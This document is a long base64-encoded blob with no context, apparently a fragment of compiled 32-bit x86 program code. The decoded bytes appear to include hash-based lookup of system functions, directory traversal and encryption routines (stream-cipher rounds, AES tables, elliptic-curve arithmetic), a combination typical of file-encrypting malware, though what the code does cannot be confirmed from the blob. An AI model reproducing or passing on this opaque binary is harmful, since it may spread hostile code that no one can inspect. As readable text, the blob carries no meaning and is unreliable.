FGLfQiB9z5tRweLWShqK1iJRfwPtzNmhfZ0LYvQjUa/jVsCZoP4GXcDg84gadIPAQAAD7fGD7czA9BmhfZ13olV/ItV+ItF/DvHdA+LCTvKdbgzwF9eW4vlXcOLQRDr9FWL7IPsDLmXAwAAU1aLdQiB9sd2AADB5hAzdQiB9rmvAACLxsHoFVc7wXdVdEyD6F90QIPoCXQ0g+h7dCgtAAEAAHQaLYsAAAB0DIPoH3VXuJNfABDrb7hBXAAQ62i4Wl8AEOthuOxcABDrWrg8XQAQ61O4zF8AEOtMuPhcABDrRS3bBAAAdDktcAEAAHQrg+g/dB+D6G50Ey3KAAAAdQe4IV8AEOsfi0UI6xq4BWAAEOsTuHpcABDrDLgwXQAQ6wW4s1wAEP/Qi/iF/3RRi088geb//x8AM9uLTDl4A8+LQSSLUSADx4lF+APXi0EcA8eJVfyJRfSLQRiJRQiFwHQeiwSaA8dQ6NP8//8l//8fAFk7xnQSi1X8QztdCHLiM8BfXluL5V3Di0X4i030D7cEWIsEgQPH6+hVi+yD7AyNRfRQagtqCWiFAwAAaCjMARDo3u7//4PEFMZF/wCNRfRQaL42E1zolf7//1n/0IvlXcNVi+yD7AyNRfRQagtqDWiuBQAAaCjMARDope7//4PEFMZF/wCNRfRQaL42E1zoXP7//1n/0IvlXcNVi+yD7AyNRfRQagpqDGgDAwAAaCjMARDobO7//4PEFMZF/gCNRfRQaL42E1zoI/7//1n/0IvlXcNVi+yD7AyNRfRQagtqDGh1BgAAaCjMARDoM+7//4PEFMZF/wCNRfRQaL42E1zo6v3//1n/0IvlXcNVi+yD7AyNRfRQaglqD2jKAAAAaCjMARDo+u3//4PEFMZF/QCNRfRQaL42E1zosf3//1n/0IvlXcNVi+z/dQhovjYTXOia/f//Wf/QXcNVi+xWi3UIagD/dRD/dgT/dQz/FWjKARAzyTlGBF4PlMGLwV3DVYvsi0UMU1ZXM9vHAAEAAACL++i95f//i3UIqf///392IlNTU/92BP8VBMoBEEfooeX//wPAO/hy6OsIamTosuj//1k5Xgh18/826Evb////dgToAN3//1lZX15bXcNVi+xTVot1CDPbV4v7iV4I6GHl//+p////f3YoU1NW/3UMU1P/FdjKARCFwHQe/0YIUOjC3P//WUfoOOX//wPAO/hy2DPAQF9eW13DM8Dr91WL7Fb/dQzow9r//4t1CFmJBoXAdQQzwOtE/3UQagBqAGr//xVoygEQiUYEhcB1Cv826LXa//9Z69z/dRRW6G3///9ZWYXAdRL/Nuic2v///3YE6FHc//9Z69wzwEBeXcNVi+yLRQj/dQz/MOhB2v//WVldw1WL7ItFCP91DP8w6HXa//9ZWV3DVYvs/3UYi0UI/3UU/3UQ/3UM/3AE/xUEywEQXcNVi+z/dRSLRQj/dRD/dQz/cAT/FQTKARBdw1WL7FaLdQj/dhTo2tv///92GOiG2v//WVleXcNVi+xWi3UIM8BQaAAAAEj/dSCJRgxQ/3UciUYI/3UY/3UM/xVkygEQiUYUg/j/dQQzwOsq/3UM6JHv//+JRhhZhcB1C/92FOiB2///Wevhi0UQiUYgi0UUiUYkM8BAXl3DVYvsi0UIUGoA/3UQ/3UM/3AU/xU4ywEQXcNVi+yLVQiLSggDTQyLQgwTRRCJSgiJQgxdw1WL7ItFCFBqAP91EP91DP9wFP8VFMsBEF3DVYvsgexoAgAAU1aLdQgzwFeLfQyL2FBWiUX0iV3wiUX4iUX8/1cEWVmFwA+ErAEAAI1F8FZQ6LcCAABTVv93DP9XKIPEFAFHGBFXHOmJAQAAi0X4C0X8dD//M1boYu7//4vzi1sEiV3w/zboYtn//1boXNn//4tF+IPEEItN/IPA/4lF+IPR/wvBiU38dQMhRfSLdQgzwECFwA+EXAEAAFboxu7//8cEJEjBABBWiUXs6Ent//9ZWY2FmP3//1BW/xVwywEQiUUMg/j/D4QLAQAAjYXE/f//aBzAABBQ6H/t//9ZWYXAD4THAAAAjYXE/f//aEDBABBQ6GTt//9ZWYXAD4SsAAAA94WY/f//AAQAAA+FnAAAAI2FxP3//1CLReyNBEZQ6Jjt///2hZj9//8QWVl0QGhMwQAQVui+7P//jYXE/f//UFb/VwSDxBCFwHRhjUXwVlDolQEAAI2FxP3//1BW/3cM/1cog8QUAUcYEVcc6z6LhbT9//+Lnbj9//9QiUXojYXE/f//U1BW/1cIg8QQhcB0G/916I2FxP3//1NQVv93EP9XLIPEFAFHIBFXJIM/AHUYjYWY/f//UP91DP8VUMsBEIXAD4UB/////3UM/xWsywEQi13wgz8AD4Rr/v//6xSL84tbBP826N7X//9W6NjX//9ZWYXbdehfXluL5V3DVYvsagD/dRj/dRRqAP91EP91DP91CP8VZMoBEDPJg/j/D0TBXcNVi+xqAP91FP91EP91DP91CP8VFMsBEF3DVYvsi0UIg8D+agJZO8gbwEBdw1WL7Fb/dQj/FVTLARCL8GaDPi51EVbo+Oz//1mD+AF2BY1GAusCM8BeXcNVi+yD7BBWaP7/AADo8Nb//4vwWYX2dFGNRfBQag5qCmhlAwAAaCjMARDot+j//zPAZolF/o1F8FBW6ADs//+LRQiDwAJQVugv6///aEzBABBW6CTr////dQxW6Bz9//9W6OjW//+DxDhei+Vdw1WL7FZqCOiI1v//i/BZhfZ0Mf91DOgS7P//g2YEAFmLTQiJBotBCAtBDHQIi0EEiXAE6wKJMTPAiXEEQAFBCINRDABeXcNVi+z/dQz/dQj/FSzLARBdw1WL7IPsEFZo/v8AAOgr1v//i/BZhfZ0e1eNRfBQag5qDGhDAwAAaCjMARDo8ef//zPAZolF/o1F8FBW6Drr//+DxBxqWl/rOv8VpMsBEIPA/oP4Anci/3UIVuhY/P//D7dGCFlZg/hhcg6D+Hp3CSXf/wAAZolGCGb/RggzwGaJRg5WZjl+CHa/6PvV//9ZM8BAX16L5V3DVYvsg+wQjUX4UP91DGoAagFqAv8VSMsBEIXAdAczwOmdAAAAg038/7gAQAAAV1CJRfTobdX//4v4WYX/dQ3/dfj/FRTKARAzwOt1U1aNRfRQV41F/FD/dfj/FZzLARCJRfCFwHU8M9s5Xfx24I13FIN+8AF1DP91CP826CP+//9ZWfZG+AJ0Do1G7FD/dQjobP///1lZQ4PGIDtd/HLRi0XwPQMBAAB1pFfoQtX//1n/dfj/FRTKARD32F4bwEBbX4vlXcNVi+yD7FRTV41F/DPbUGoBU4v7iV38/xUMygEQhcAPhbsAAABW60E5Xfh0Tf91+Oir1P//i/BZhfZ0LY1F9Ild9FD/dfhW/3UI/xWsygEQhcB0DotF/FP/dfSLCFZQ/1EQVujF1P//WY1F+FD/dQj/FbTLARCFwHWui0X8jVWsagFSUIsI/1EwhcB1STldtHREi0X8U1NTiwhTUP9RFIXAdTP/dbToNdT//4v4WYX/dCSLTQyNRfSLdbRQVokxi038V1GLEf9SDIXAdAlX6FrU//9Zi/uLRfxQiwj/UQhei8dfW4vlXcNVi+yB7FwBAABWV42FpP7//1BokAAAAGoEaOcEAABoKMwBEOi15f//g8QUM/YzwGaJhTT///+NhaT+//9WVlZWUP8VhMsBEIv4M8CJffiF/w+EygEAAGaJRdAzyY1FuMdFuDwAAABQVlb/dQhBiXW8iXXAiXXEiXXIiU3MiXXUiXXYiXXciXXgiXXkiU3oiXXsiXXw/xUQzAEQhcB1Dlf/FcjKARAzwOl0AQAAi03IM9KLRcxTVmaJFEH/ddD/dchX/xXgywEQi9iJXfSF23UDV+thi0XkZjkwdQZqL1lmiQiNRaxQaghqD2jnBgAAaCjMARDo5eT//4PEFDPAg33EArkAAIAAZolFtA9EwQ0AAQAAUFZWVv915I1FrFBT/xUAzAEQi9iF23UXV/8VyMoBEP919P8VyMoBEDPA6d4AAACNhTj///+L/lBqcmoNaMsDAABoKMwBEOiA5P//g8QUM8BmiUWqVv91EI2FOP////91EP91DGr/UFP/FQDKARCFwHUu6Nnb//89jy8AAHUeagSNRfzHRfwAMwEAUGofU/8VcMoBEIXAagFYD0X4hf91tItFGFZTiTD/FczLARCLffiFwHRAVo1F+Il1/FCNRfzHRfgEAAAAUFZoEwAAIFP/FfjLARCLTRj32BvAI0X8iQE9yAAAAHUN/3UUU+gX/f//WVmL8Ff/FcjKARD/dfT/FcjKARBT/xXIygEQi8ZbX16L5V3Dw+l78f//VYvs6FMAAACFwHUCXcNTVugD2///hcB0DLtQwQAQvgCWAADrCrtQVwEQvgA2AABXakBoADAAAFZqAP8V7MoBEIv4hf90EFZTV+jg0f//g8QM/3UI/9dfXltdw1WL7IHsiAIAAFdqCbjiBwAAM/9miUXwR1hmiUXyM8BmiUX0agtYZolF9jPAiUX4iUX8jUXcUI1F8FD/FVDKARCFwHUHM8DpBwEAAOhO2///uQEFAABmO8F2Eo1F7FD/FfDKARCFwA+E5AAAAGgEAQAAjYV4/f//UP8VCMwBEIXAdMJTVo2FeP3//2hMwQAQUOhW5f//jYV4/f//UOi35v//jZ14/f//vijMARCNHEONRaRQahxqCGgFAQAAVuiU4v//M8BmiUXAjUXEUGoUahBohAUAAFboe+L//zPAg8Q0ZolF2DP2jUWkiUXkjUXEiUXojUWAUGoA/3S15I2FeP3//1Do4+T//1lZUP8VQMoBEIXAdBWNRdxQjUWUUP8VnMoBEDPJhcAPSfkzwEZmiQOD/gJ8vYt17Ohh2v//uQEFAABmO8F2B1b/FejKARBeW4vHX4vlXcNVi+z/dRCLRQj/dQz/MIPABFDo1gYAAIPEEF3DVYvsVv91DIt1CP91EI1GBFDo3gsAADPJiQaDxAyFwA+VwYvBXl3DVYvsg+xAU4tdCFcz/zm7GAEAAHUHM8DpewEAAIF9EAAAAQB38FaLdRiF9nRAg/4wD4dGAQAAVv91FI1FwFDo9s///4PEDGowWDvwdBIrxlCNRcADxldQ6ALQ//+DxAyNRcBQU+hBAgAAWVnrD2owjUXAV1Do5c///4PEDDm7HAEAAHUpjbP4AAAAahBW6Ors//+NgwgBAABQVlPoHf///4PEFMeDHAEAAAEAAACLRRCD+BByX4t1DIl1CI2D+AAAAGoQUOiz7P//Vo2D+AAAAFBT6Ob+//+DxBSNiwgBAACLBL47BLl1C0eD/wR18umJAAAAi0UQi/mD6BCJRRClpaWli3UIM/+DxhCJdQiD+BByCOuni00MiU0IhcB0UI2z+AAAAGoQVuhQ7P//jUXwUFZT6Ib+//+DxBSNiwgBAACNVfCLBLo7BLl1CEeD/wR18usp/3UQi/mNdfCNRfBQ/3UIpaWlpejOzv//g8QMi4v0AAAAgfkAAAABdgQzwOsWQYmL9AAAAI1NwFFT6BkBAABZM8BZQF5fW4vlXcNVi+yD7CBXaCABAABqAP91COirzv//aghZM8CNfeDzq41F4FBoAAEAAP91COgL/v///3UY/3UU/3UQ/3UM/3UI6FAAAACDxCxfi+Vdw1WL7FOLXQxWi3UQV4X2dCy4AAABAGoAO/CL/moAD0f4V1P/dQjo7P3//4PEFIXAdBMD37gAAAEAK/d12TPAQF9eW13DM8Dr91WL7IPsMDPJVot1GFdqMF8793dcOX0QdVeF9nQWVv91FI1F0FDo3c3//4PEDIvOO/d0FYvHK8FQjUXQA8FqAFDo583//4PEDFf/dQyNRdBQ6Anr//+LdQiNRdBQVugWAAAAM8CDxBRAiYb0AAAA6wIzwF9ei+Vdw1WL7IPsMFOLXQhWVzP2jbv4AAAAahBX6Lbq//+NRdADxlBXU+jq/P//g8YQg8QUg/4wcuBqMP91DI1F0FDopOr//41F0FBoAAEAAFPo3vz//4118MeDGAEAAAEAAAClg8QYpaWlX15bi+Vdw1WL7IPsRFaLdRSF9g+EkgAAAFOLXRCNTbyLwyvBiUUUi0UMK8FXiUX8/3UIjUW8M/9Q6P8AAACLRQhZWYNAIAF1A/9AJIP+QHYyi138i9eLfRSNTbwDympAigQLMgFCiAQPWDvQcuuLXRAr8AFFFAPYAUUMAUX8iV0Q662F9nQii0UMjU28K8Er2YlFDI1NvAPPigQIMgFHiAQLi0UMO/5y619bXovlXcNVi+yLVQiLTQyLAYlCGItBBINiIACDYiQAiUIcXcNVi+yBfRAAAQAAi00Mi1UIVosBiUIEi0EEiUIIi0EIiUIMi0EMiUIQdQqDwRC+UI0BEOsFvmCNARCLAYlCLItBBIlCMItBCIlCNItBDIlCOIsGiQKLRgSJQhSLRgiJQiiLRgyJNezVARCJQjxeXcNVi+yD7HRTVot1DFdqEFmNfYzHRcwKAAAA86WLRbSLfbyLTciLVcSLdcCLXbiJRfyLRbCJReCLRayJReyLRaiJRdSLRaSJRdiLRaCJReSLRZyJRfCLRZiJRdyLRZSJRfSLRZCJRfiLRYyJfdCJRegDx4t90MHABzFF8ItF8ANF6MHACTFF7ItF7ANF8MHADTP4i0XsA8eJfdDBwBIxReiLRfgDReTBwAcxReCLReADReTBwAkz8It92ItF4APGwcANMUX4i0X4A8bBwBIxReSLRfwDx8HABzPQi0X8A8LBwAkxRfSLRfQDwsHADTP4i0X0A8eJfdiLfdzBwBIxRfyNBAvBwAcz+Il93I0ED4t91MHACTP4i0XcA8eJfdTBwA0z2I0EH8HAEjPIi0XoA0XcwcAHMUX4i0X4iUWQA0XowcAJMUX0i0X0iUWUA0X4wcANi33cM/iLRfQDx4l93MHAEol9mIt96DP4i0XkA0XwwcAHMUXYi0XYiUWkA0XkwcAJiX3oiX2Mi33UM/iLRdgDx4l91MHADTFF8ItF8IlFnAPHwcASiX2oi33kM/iLRfyJfeSJfaCLfeADx8HABzPYi0X8A8PBwAkxReyLReyJRawDw8HADTP4i8eJfeCLfdCJRbADRezBwBIxRfyLRfyJRbSNBBHBwAcz+Il90Il9vI0EOcHACTPwjQQ+wcANM9CNBDLBwBIzyINtzAGLRegPhUr+//+JXbiNRYyLXQyJVcQz0olNyCvYiXXAjQSTi0QFjAFElYxCg/oQfO+LfQiNdYxqEFnzpV9eW4vlXcNVi+yD7BCLTRBTVr4A/wD/u/8A/wCLAYvQwcAII8PByggj1gvQi0EEV4t9CDMXiVUIi9DBwAgjw8HKCCPWC9CLQQgzVwSL2MHACCX/AP8AwcsIiVX4I94L2ItBDDNfCIvQwcAIJf8A/wDByggj1gvQi8PB6AgPtsiLRfgzVwzB6BCLDI1wlQEQD7bAMwyFcJEBEItFCMHoGDMMhXCNARAPtsIzDIVwmQEQi8IzTxDB6AiJTfQPtsiLw8HoEA+2wIsMjXCVARAzDIVwkQEQi0X4wegYMwyFcI0BEItFCA+2wDMMhXCZARCLwjNPFMHoEIlN/A+2yItFCMHoCA+2wIsMjXCRARAzDIVwlQEQi8PB6BjB6hgzDIVwjQEQiU0Qi034i3UQD7bBwekID7bJMzSFcJkBEIvGiXUQM0cYiwyNcJUBEIlFEItFCMHoEA+2wDMMhXCRARAzDJVwjQEQD7bDMwyFcJkBEItFDDNPHIPHINH4g+gBiUUM6e4BAACLdRCLxsHoCA+2yItF/MHoEA+2wIsMjXCVARCLVfQzDIVwkQEQi8LB6BgzDIVwjQEQi0UID7bAMwyFcJkBEDMPi0UIwegIiU34D7bIi8bB6BAPtsCLDI1wlQEQMwyFcJEBEItF/MHoGDMMhXCNARAPtsIzDIVwmQEQM08Ei0UIwegQiU3wD7bIi8LB6AgPtsDB6hCLHI1wkQEQi038MxyFcJUBEIvGwegYMxyFcI0BEA+2wcHpCA+2yTMchXCZARAzXwgPtsKLFI1wlQEQMxSFcJEBEItFCMHoGDMUhXCNARCLxg+2wDMUhXCZARCLwzNXDMHoCA+2yItF8MHoEA+2wIsMjXCVARAzDIVwkQEQi0X4wegYMwyFcI0BEA+2wjMMhXCZARCLwjNPEMHoCIlN9A+2yIvDwegQiwyNcJUBEA+2wDMMhXCRARCLRfDB6BgzDIVwjQEQi0X4D7bAMwyFcJkBEIvCM08UwegQiU38D7bIi0X4wegID7bAiwyNcJEBEMHqGDMMhXCVARCLw8HoGDMMhXCNARCJTRCLTfCLdRAPtsHB6QgPtskzNIVwmQEQi8aJdRAzRxiLDI1wlQEQiUUQi0X4wegQD7bAMwyFcJEBEDMMlXCNARAPtsMzDIVwmQEQM08cg8cgg20MAYlNCA+FCf7//4tF/L4AAAD/wegQD7bAi130i1UUiwyFcJ0BEItFEIHhAAD/AMHoCA+2wIsEhXCdARAlAP8AADPIi8PB6BiLBIVwnQEQJQAAAP8zyItFCA+2wA+2BIVwnQEQM8gzD4vBwcEIwcgIgeH/AP8AJQD/AP8LwYkCi0UQwegQD7bAiwyFcJ0BEItFCIHhAAD/AMHoCA+2wIsEhXCdARAlAP8AADPIi0X8wegYiwSFcJ0BECPGM8gPtsMPtgSFcJ0BEDPIM08Ei8HBwQjByAiB4f8A/wAlAP8A/wvBiUIEi0UIwegQD7bAiwyFcJ0BEIvDwegIgeEAAP8AD7bAiwSFcJ0BECUA/wAAM8iLRRDB6BiLBIVwnQEQI8YzyItF/A+2wA+2BIVwnQEQM8gzTwiLwcHICCUA/wD/wcEIgeH/AP8AwesQC8GJQggPtsOLDIVwnQEQi0X8geEAAP8AwegID7bAiwSFcJ0BECUA/wAAM8iLRQjB6BiLBIVwnQEQI8YzyItFEA+2wA+2BIVwnQEQM8gzTwyLwcHBCMHICIHh/wD/AF8lAP8A/wvBXolCDFuL5V3DVYvsU4tdDLoA/wD/Vot1CFeLA4vIwcAIJf8A/wDByQgjyo1+BAvIiQ6LSwSLwcHICCPCwcEIgeH/AP8AC8GJB4tLCIvBwcgII8LBwQiB4f8A/wALwYlGCItDDIvQwcoIwcAIgeIA/wD/Jf8A/wAL0IF9EIAAAACJVgwPhfIAAACLwrsAAAD/wegQD7bAiwyFcJ0BEIvCwegIgfEAAAABD7bAI8uLBIVwnQEQJQAA/wAzyIvCwegYD7YEhXCdARAzyA+2wosEhXCdARAlAP8AADPIiwczDjPBiU4Qi04IiUYUM8iLwolOGDPBiUYcvnS1ARCNfxCLTwiLwcHoCA+2wIsUhXCdARCLwcHoEIHiAAD/AA+2wIsEhXCdARAjwzPQi8HB6BgPtgSFcJ0BEDPQD7bBiwSFcJ0BECUA/wAAM9AzV/wzFoPGBIlXDIsHM8KJRxCLTwQzyIlPFItHCDPBiUcYgf6YtQEQdYhqCljpCwMAAItLEIvBwcgIJQD/AP/BwQiB4f8A/wALwYlGEItDFIvQwcoIwcAIgeIA/wD/Jf8A/wAL0IF9EMAAAACJVhQPhQoBAACLwrsAAAD/wegQD7bAiwyFcJ0BEIvCwegIgfEAAAABD7bAI8uLBIVwnQEQJQAA/wAzyIvCwegYD7YEhXCdARAzyA+2wosEhXCdARAlAP8AADPIiwczDr90tQEQM8GJThiLTggzyIlGHItGDDPBiU4giUYkg8Yoi07oM078i0bsM8GJDolGBI12GItO7IvBwegID7bAixSFcJ0BEIvBwegQgeIAAP8AD7bAiwSFcJ0BECPDM9CLwcHoGA+2BIVwnQEQM9APtsGLBIVwnQEQJQD/AAAz0DNW2DMXg8cEiVbwi0bcM8KJRvSLTuAzyIlO+ItG5DPBiUb8gf+QtQEQD4Vz////agzprf7//4tLGLoA/wD/i8HBwQjByAiB4f8A/wAjwgvBiUYYi0sci8HByAjBwQgjwoHh/wD/AAvBgX0QAAEAAIlGHA+FegEAAIvIx0UMdLUBEMHoELsAAAD/D7bAixSFcJ0BEIvBwegIgfIAAAABD7bAI9OLBIVwnQEQJQAA/wAz0IvBwegYD7YEhXCdARAz0A+2wYtOCIsEhXCdARAlAP8AADPQiwczFr8A/wAAM8KJViCJRiSNVjAzyIlVEItGDDPBiU4oiUYsvgAA/wCLSvyLwcHoEA+2wIsUhXCdARCLwcHoCCPWD7bAiwSFcJ0BECPHM9CLwcHoGIsEhXCdARAjwzPQD7bBD7YEhXCdARAz0ItFEDNQ4IkQi0DkM8KLVRCLSuiJQgQzyItC7DPBiUoIiUIMg8IgiVUQi0rsi8HB6AgPtsCLFIVwnQEQi8HB6BAj1g+2wIsEhXCdARAjwzPQi8HB6BgPtgSFcJ0BEDPQD7bBi00MiwSFcJ0BECPHM9CLRRAzUNAzEYlQ8ItA1DPCi1UQiUL0i0rYM8iJSviLQtwzwYlC/ItFDIPABIlFDD2MtQEQD4US////ag7p8fz//zPAX15bXcNVi+yB7PAEAABTVle/kAAAAI2F4Pz//1cz9lZQ6O6///9XM9uJtTz///+NhUD///9DVlCJnTj////o0b///1eNhaj+//+JnaD+//9WUIm1pP7//+i3v///g8cIjYVA/P//V1ZQ6Ka///+Nhdj8//+JReSNtaD+//+NhTj///+JddyJRewz9o2FQPz//1eJRfSNhaj7//9WUOhyv///aJAAAACNhRD+//+JnQj+//9WUIm1DP7//+hUv///g8RIjYUQ+///V1ZQ6EO///9okAAAAI2FeP3//4mdcP3//1ZQibV0/f//6CW///+LdRSNhaj7//+JRfCNvdj8//+DxBiNhQj+//+JReCNhRD7//+JRfiNhXD9//+JReiLRRBqFFnzpY1YH8dF0CAAAACJXdSNjdj8//+KA4td3IhF/8dF2AgAAADA6AcPtsCZi/KL+FZXUVPouhgAAFZX/3Xs/3X06K0YAAD/dRT/dez/deT/dfRT/3Xg/3Xw/3Xo/3X46IsKAACDxERWV/918P91+Oh/GAAAVot14FeLfehWV+hwGAAAi03wi8OLXfiDxCCJRfiL14tF9IlF6ItF5IlF8ItF7IlF4IpF/wLAiVX0g23YAYlN5Il17IhF/w+FZf///4ld3Itd1EuDbdABiV3UD4VC////i3Xci30IahRZ86WLfQyL8moUWfOlX15bi+Vdw1WL7IHskAEAAI2FEP///1ZX/3UMUOgJFAAAjYUQ////UI2FYP///1Do9hMAAI2FYP///1CNRbBQ6OYTAAD/dQyNRbBQjYXA/v//UOj1CwAAjYUQ////UI2FwP7//1CNhXD+//9Q6NsLAACNhXD+//9QjUWwUOipEwAAjYXA/v//UI1FsFCNhRD///9Q6LQLAACDxESNhRD///9QjUWwUOh/EwAAjUWwUI2FYP///1DobxMAAI2FYP///1CNRbBQ6F8TAACNRbBQjYVg////UOhPEwAAjYVg////UI1FsFDoPxMAAI2FEP///1CNRbBQjYXA/v//UOhKCwAAjYXA/v//UI1FsFDoGBMAAI1FsFCNhWD///9Q6AgTAACDxERqBF+L942FYP///1CNRbBQ6PASAACNRbBQjYVg////UOjgEgAAg8QQg+4BddiNhcD+//9QjYVg////UI2FEP///1Do4AoAAI2FEP///1CNRbBQ6K4SAACNRbBQjYVg////UOieEgAAg8QcaglejYVg////UI1FsFDoiBIAAI1FsFCNhWD///9Q6HgSAACDxBCD7gF12I2FEP///1CNhWD///9QjUWwUOh7CgAAjUWwUI2FYP///1DoSRIAAI2FYP///1CNRbBQ6DkSAACDxByNRbBQjYVg////UOgmEgAAjYVg////UI1FsFDoFhIAAIPEEIPvAXXYjYXA/v//UI1FsFCNhRD///9Q6BkKAACNhRD///9QjUWwUOjnEQAAjUWwUI2FYP///1Do1xEAAIPEHGoYXov+jYVg////UI1FsFDovxEAAI1FsFCNhWD///9Q6K8RAACDxBCD7wF12I2FEP///1CNhWD///9QjYXA/v//UOivCQAAjYXA/v//UI2FYP///1DoehEAAI2FYP///1CNRbBQ6GoRAACDxBxqMV+NRbBQjYVg////UOhUEQAAjYVg////UI1FsFDoRBEAAIPEEIPvAXXYjYXA/v//UI1FsFCNhWD///9Q6EcJAACNhWD///9QjUWwUOgVEQAAjUWwUI2FYP///1DoBREAAIPEHI2FYP///1CNRbBQ6PIQAACNRbBQjYVg////UOjiEAAAg8QQg+4BddiNhRD///9QjYVg////UI1FsFDo5QgAAI1FsFCNhWD///9Q6LMQAACNhWD///9QjUWwUOijEAAAjUWwUI2FYP///1DokxAAAI2FYP///1CNRbBQ6IMQAACNRbBQjYVg////UOhzEAAAjYVw/v//UI2FYP///1D/dQjofwgAAIPEQF9ei+Vdw1WL7IHsGAEAAGog/3UMjUXgUOj1uf//ikX//3UQgGXg+CQ/DECIRf+NRZBQ6CsDAACNRZBQjUXgUI2FOP///1CNhej+//9Q6Nb5//+NhTj///9QjUWQUOjV+///jUWQUI2F6P7//1CNhTj///9Q6AMIAACNhTj///9Q/3UI6AkAAACDxEAzwIvlXcNVi+yLVQyD7EAzyYsEyolEjcBBg/kKfPNTVldqAl+L9zPbi0ydwIvRwfofi8H2wwF0DsH4GSPQ99qLwsHgGesMwfgaI9D32ovCweAaKVSdxAPBiUSdwEOD+wl8xotN5IvRwfofi8HB+Bkj0Pfai8LB4BkDyGvC7YtVwIlN5APQiVXAg+4BdZmLyovCwfgau////wHB+R8jyPfZi8HB4BoD0ClNxIlVwDPSi0SVwIvI9sIBdAfB+Rkjw+sIwfkaJf///wMBTJXEiUSVwEKD+gl82ItF5IvIi3XAI8PB+RmJReRrwRMD8Il1wIPvAXW5jZYTAAD8M9vB+h+/////AUP30old+Ild/PbDAXQDV+sFaP///wP/dJ3A6FgSA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